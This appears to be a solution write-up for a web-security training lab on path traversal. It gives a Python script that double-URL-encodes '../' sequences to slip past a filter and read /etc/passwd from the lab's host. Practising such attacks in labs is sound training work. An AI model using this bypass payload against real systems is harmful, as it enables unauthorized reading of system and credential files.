# File path traversal, traversal sequences stripped with superfluous URL-decode

> This lab contains a path traversal vulnerability in the display of product images.
> The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.
> To solve the lab, retrieve the contents of the `/etc/passwd` file.

```python
import requests

# --- Configuration ---
# Lab: File path traversal, traversal sequences stripped with superfluous URL-decode
# Replace with your specific lab ID
BASE_URL = "https://0aa5001803822cef800a6c1800d700f7.web-security-academy.net/"

def exploit_double_encoding(base_url):
    """
    Exploits path traversal using Double URL Encoding (%252e%252e%252f)
    to bypass filters that decode input incorrectly.
    """
    # Payload: %252e%252e%252f is Double Encoded ../
    # We use it 3 times to reach root. 
    # Note: We construct the URL manually to prevent 'requests' from re-encoding.
    payload = "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd"
    
    target_url = f"{base_url}image?filename={payload}"
    
    print(f"[*] Sending payload to: {target_url}")
    
    # Send GET request
    response = requests.get(target_url)
    
    # Verify and print output
    if "root:x:0:0" in response.text:
        print("[+] Success! /etc/passwd retrieved:\n")
        print(response.text)
    else:
        print("[-] Exploit failed.")

if __name__ == "__main__":
    exploit_double_encoding(BASE_URL)
```